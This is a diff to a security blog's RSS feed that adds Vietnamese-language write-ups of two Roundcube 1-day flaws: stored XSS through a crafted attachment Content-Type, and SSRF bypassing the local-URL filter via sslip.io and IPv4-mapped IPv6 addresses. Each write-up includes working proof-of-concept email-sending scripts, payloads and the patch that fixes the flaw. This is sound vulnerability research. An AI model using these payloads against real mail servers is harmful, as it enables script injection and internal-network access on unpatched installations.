@@ -4,12 +4,13 @@
         <link>https://g03m0n.github.io/tags/cve/</link>
         <description>Cve - Tag - g03m0n</description>
         <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 09 Jul 2026 08:29:01 &#43;0800</lastBuildDate><atom:link href="https://g03m0n.github.io/tags/cve/" rel="self" type="application/rss+xml" /><item>
-    <title>Zero-click Stored XSS in Roundcube (CVE-2026-54433)</title>
+    <title>1-days Roundcube Research</title>
     <link>https://g03m0n.github.io/posts/cve-2026-54433/</link>
     <pubDate>Thu, 09 Jul 2026 08:29:01 &#43;0800</pubDate>
     <author>g03m0n</author>
     <guid>https://g03m0n.github.io/posts/cve-2026-54433/</guid>
-    <description><![CDATA[<h1 id="zero-click-stored-xss-in-roundcube-cve-2026-54433">Zero-click Stored XSS in Roundcube (CVE-2026-54433)</h1>
+    <description><![CDATA[<h1 id="1-days-roundcube-research">1-days Roundcube Research</h1>
+<h2 id="zero-click-stored-xss-in-roundcube-cve-2026-54433">Zero-click Stored XSS in Roundcube (CVE-2026-54433)</h2>
 <h3 id="description">Description</h3>
 <table>
 <thead>
@@ -70,6 +71,155 @@ VD:</p>
 <h3 id="patch">Patch</h3>
 <p></p>
 <p>Ứng dụng lọc ký tự <code>&lt;&gt;</code></p>
+<h2 id="stored-xss-via-mime-type-of-attachment-cve-2026-54432">Stored XSS via MIME-type of attachment (CVE-2026-54432)</h2>
+<h3 id="description-1">Description</h3>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Version Affected</th>
+<th>Required Authentication</th>
+<th>?-Day</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Stored XSS</td>
+<td>&lt; 1.7.2, &lt; 1.6.17</td>
+<td>Yes (User)</td>
+<td>1-day</td>
+</tr>
+</tbody>
+</table>
+<p>Lỗi xảy ra trên trang cảnh báo attachment khi MIME type khai báo trong email không khớp với nội dung thực tế. Roundcube hiển thị giá trị MIME type attacker kiểm soát trong HTML mà chưa escape đầy đủ, dẫn đến stored XSS khi nạn nhân mở attachment warning page.</p>
+<h3 id="root-cause-1">Root Cause</h3>
+<p>Trong <code>program/actions/mail/get.php</code>, giá trị <code>$mimetype</code> được lấy từ attachment:</p>
+<p></p>
+<p>Khi MIME validation fail, Roundcube đưa <code>$mimetype</code> vào biến <code>$expected</code>:</p>
+<p></p>
+<p>Vấn đề là chỉ phần extension được escape, còn <code>$mimetype</code> thì không. Vì vậy payload trong <code>Content-Type</code> có thể được render như HTML thật trong template:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">Expected</span><span style="color:#f92672">:</span> $expected; <span style="color:#a6e22e">found</span><span style="color:#f92672">:</span> $detected
+</span></span></code></pre></div><p>Payload mẫu: <code>Content-Type: &quot;&lt;img src=x onerror=alert(1)&gt;&quot;/x; name=&quot;poc.txt&quot;</code></p>
+<h3 id="steps-to-reproduce-1">Steps to Reproduce</h3>
+<p>Chạy script dưới đây để gửi mail kèm attachment:</p>
+<p><code>script.py</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> smtplib
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>smtp_host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>
+</span></span><span style="display:flex;"><span>smtp_port <span style="color:#f92672">=</span> <span style="color:#ae81ff">25</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sender <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;flash@localhost.com&#34;</span>
+</span></span><span style="display:flex;"><span>recipient <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;batman@localhost.com&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>raw <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;&#34;From: flash@localhost.com</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">To: batman@localhost.com</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Subject: Test XSS</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Date: Sat, 11 Jul 2026 00:25:00 +0700</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">MIME-Version: 1.0</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Type: multipart/mixed; boundary=&#34;test&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--test</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Type: text/plain; charset=UTF-8</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Transfer-Encoding: 7bit</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Experimental payload.</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--test</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Type: &#34;&lt;img src=x onerror=alert(1)&gt;&#34;/x; name=&#34;poc.txt&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Disposition: inline; filename=&#34;poc2.txt&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Transfer-Encoding: base64</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SGVsbG8sIHRoaXMgaXMgbm90IGFuIGltYWdlLgo=</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--test--</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> smtplib<span style="color:#f92672">.</span>SMTP(smtp_host, smtp_port, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span>) <span style="color:#66d9ef">as</span> smtp:
+</span></span><span style="display:flex;"><span>    smtp<span style="color:#f92672">.</span>ehlo()
+</span></span><span style="display:flex;"><span>    smtp<span style="color:#f92672">.</span>sendmail(sender, [recipient], raw)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;sent&#34;</span>)
+</span></span></code></pre></div><p>Mở warning page:</p>
+<pre tabindex="0"><code>http://localhost/rc170/public_html/?_task=mail&amp;_action=get&amp;_mbox=INBOX&amp;_uid=&lt;UID&gt;&amp;_part=2&amp;_embed=1&amp;_mimewarning=1
+</code></pre><p>Kết quả vulnerable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>Expected: &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">static.php/x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span>&gt;/ (.png); found: text/plain (.txt)
+</span></span></code></pre></div><p>Browser thực thi <code>alert(1)</code>.</p>
+<p></p>
+<h3 id="patch-1">Patch</h3>
+<p></p>
+<p>Sau patch, payload được render thành text:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&amp;lt;img src=x onerror=alert(1)&amp;gt;
+</span></span></code></pre></div><hr>
+<h2 id="bypass-url-filter-leading-to-ssrf">Bypass url filter leading to SSRF</h2>
+<h3 id="description-2">Description</h3>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Version Affected</th>
+<th>Required Authentication</th>
+<th>Day</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SSRF</td>
+<td>&lt; 1.7.2, &lt; 1.6.17</td>
+<td>Yes (User)</td>
+<td>1-day</td>
+</tr>
+</tbody>
+</table>
+<p>Roundcube có cơ chế fetch CSS từ xa thông qua endpoint <code>utils/modcss</code>. Trước khi fetch, URL phải được kiểm tra bằng <code>rcube_utils::is_local_url()</code>. Một số URL trỏ về local/loopback không bị nhận diện đúng, dẫn đến SSRF.</p>
+<h3 id="root-cause-2">Root Cause</h3>
+<p>Trong <code>program/actions/mail/index.php</code>, thẻ <code>&lt;link&gt;</code> trong email HTML được rewrite sang <code>utils/modcss</code> nếu URL không bị coi là local:</p>
+<p></p>
+<p>Sau đó <code>program/actions/utils/modcss.php</code> fetch URL thật bằng HTTP client server-side:</p>
+<p></p>
+<p>Lỗi nằm ở hàm <code>is_local_url()</code>:</p>
+<p></p>
+<p>Code chỉ xử lý <code>::ffff:</code> dạng ngắn và chỉ nhận diện <code>nip.io</code>, bỏ sót <code>sslip.io</code> và IPv4-mapped IPv6 dạng mở rộng.</p>
+<p>Một số payload mẫu:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span>http://127.0.0.1.sslip.io/
+</span></span><span style="display:flex;"><span>http://[0:0:0:0:0:ffff:127.0.0.1]/
+</span></span><span style="display:flex;"><span>http://0/
+</span></span></code></pre></div><h3 id="steps-to-reproduce-2">Steps to Reproduce</h3>
+<p>Host một server local:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>python -m http.server <span style="color:#ae81ff">8000</span>
+</span></span></code></pre></div><p>Gửi email HTML bằng script kèm payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;http://127.0.0.1.sslip.io:8000/&gt;&#34;</span>&gt;
+</span></span></code></pre></div><p><code>script.py</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> smtplib
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>raw <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;&#34;From: attacker@localhost.com</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">To: batman@localhost.com</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Subject: Test SSRF</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">MIME-Version: 1.0</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Type: text/html; charset=UTF-8</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;!doctype html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;link rel=&#34;stylesheet&#34; href=&#34;http://127.0.0.1.sslip.io:8000/&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SSRF probe
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> smtplib<span style="color:#f92672">.</span>SMTP(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#ae81ff">25</span>) <span style="color:#66d9ef">as</span> s:
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>sendmail(<span style="color:#e6db74">&#34;flash@localhost.com&#34;</span>, [<span style="color:#e6db74">&#34;batman@localhost.com&#34;</span>], raw)
+</span></span></code></pre></div><p>Mở email vừa gửi/nhận → có request đến local server:</p>
+<p></p>
+<h3 id="patch-2">Patch</h3>
+<p>Fix:</p>
+<p></p>
+<p>Patch làm cho Roundcube nhận diện đúng:</p>
+<pre tabindex="0"><code>127.0.0.1.sslip.io
+0:0:0:0:0:ffff:127.0.0.1
+0
+</code></pre><p>là local URL và không đưa vào <code>$_SESSION['modcssurls']</code> để fetch server-side.</p>
 ]]></description>
 </item>
 <item>
